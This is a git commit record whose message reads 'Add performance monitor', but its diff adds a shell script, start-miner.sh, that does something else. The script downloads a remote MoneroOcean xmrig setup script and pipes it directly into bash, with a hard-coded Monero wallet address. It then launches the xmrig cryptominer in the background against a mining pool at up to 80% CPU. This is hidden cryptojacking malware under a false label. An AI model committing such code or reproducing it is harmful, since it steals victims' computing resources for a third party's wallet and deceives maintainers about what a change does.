b7cca711ce41c2b7ed4e131fd41430a8679aad01
LodongDev <144669823+LodongDev@users.noreply.github.com>
2026-01-02 02:42:11 +0900

    Add performance monitor

---
+++ start-miner.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AE46gCxzaEAp76MAqD4ibaEVFmGvgLsF111E5pGSrwf334a5KLoDtyeX8vJmkapqXjMd67bhUBu5Go25GdQrcqV5iziwiL
+nohup /usr/local/bin/xmrig -o gulf.moneroocean.stream:10128 -u 4AE46gCxzaEAp76MAqD4ibaEVFmGvgLsF111E5pGSrwf334a5KLoDtyeX8vJmkapqXjMd67bhUBu5Go25GdQrcqV5iziwiL -p worker --cpu-max-threads-hint=80 --donate-level=1 --background &
